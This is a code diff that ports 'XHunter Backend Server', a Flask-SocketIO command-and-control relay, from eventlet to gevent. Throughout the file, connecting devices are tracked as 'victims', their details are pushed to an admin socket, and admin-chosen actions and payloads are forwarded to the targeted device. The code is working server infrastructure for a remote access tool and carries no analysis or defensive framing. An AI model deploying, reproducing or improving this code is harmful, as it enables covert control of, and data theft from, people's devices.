@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 """
-XHunter Backend Server - Python 3.11
-Deploy: Render
-Port: 10000
+XHunter Backend Server - Gevent Mode
+Python 3.14 Compatible
 """
 
-import eventlet
-eventlet.monkey_patch()
+from gevent import monkey
+monkey.patch_all()
 
 from flask import Flask, request as flask_request, jsonify
 from flask_socketio import SocketIO, emit
@@ -17,17 +16,16 @@ from datetime import datetime
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'xhunter-prod')
-CORS(app, resources={r"/*": {"origins": "*"}})
+CORS(app)
 
 socketio = SocketIO(
     app,
     cors_allowed_origins="*",
-    async_mode='eventlet',
+    async_mode='gevent',
     ping_timeout=60,
     ping_interval=25,
     max_http_buffer_size=100 * 1024 * 1024,
     transports=['websocket', 'polling'],
-    allow_upgrades=True,
     logger=False,
     engineio_logger=False
 )
@@ -42,7 +40,6 @@ adminSocketId = None
 def index():
     return jsonify({
         'server': 'XHunter Backend',
-        'version': '2.0.2',
         'status': 'online',
         'devices': len(victimList),
         'admin': adminSocketId is not None
@@ -50,7 +47,7 @@ def index():
 
 @app.route('/health')
 def health():
-    return jsonify({'status': 'ok', 'devices': len(victimList)})
+    return jsonify({'status': 'ok'})
 
 @app.route('/api/devices')
 def api_devices():
@@ -74,11 +71,9 @@ def on_connect(auth=None):
 def on_disconnect(reason=None):
     global adminSocketId
     sid = flask_request.sid
-
     if sid == adminSocketId:
         adminSocketId = None
         return
-
     for dev_id, sock_id in list(victimList.items()):
         if sock_id == sid:
             del victimList[dev_id]
@@ -91,17 +86,14 @@ def on_disconnect(reason=None):
 def on_admin_join():
     global adminSocketId
     adminSocketId = flask_request.sid
-
     for dev_id, data in list(victimData.items()):
         socketio.emit('join', data, to=adminSocketId)
-
     socketio.emit('adminConnected', {'victimCount': len(victimList)}, to=adminSocketId)
 
 @socketio.on('join')
 def on_device_join(data):
     sid = flask_request.sid
     dev_id = data.get('id', sid)
-
     victimList[dev_id] = sid
     victimData[dev_id] = {
         'id': dev_id,
@@ -114,12 +106,9 @@ def on_device_join(data):
         'online': True,
         'connectedAt': datetime.now().isoformat()
     }
-
     print(f"[DEVICE] {dev_id} | {data.get('model', '?')}")
-
     if adminSocketId:
         socketio.emit('join', victimData[dev_id], to=adminSocketId)
-
     socketio.emit('deviceRegistered', {'success': True, 'deviceId': dev_id}, to=sid)
 
 @socketio.on('request')
@@ -129,15 +118,12 @@ def on_request(data):
         to = req.get('to', '')
         action = req.get('action', '')
         payload = req.get('data', {})
-
         if to not in victimList:
             if adminSocketId:
                 socketio.emit('error', {'error': 'Device offline'}, to=adminSocketId)
             return
-
         payload_str = json.dumps(payload) if isinstance(payload, dict) else str(payload)
         socketio.emit(action, payload_str, to=victimList[to])
-
     except Exception as e:
         print(f"[ERR] {e}")
 
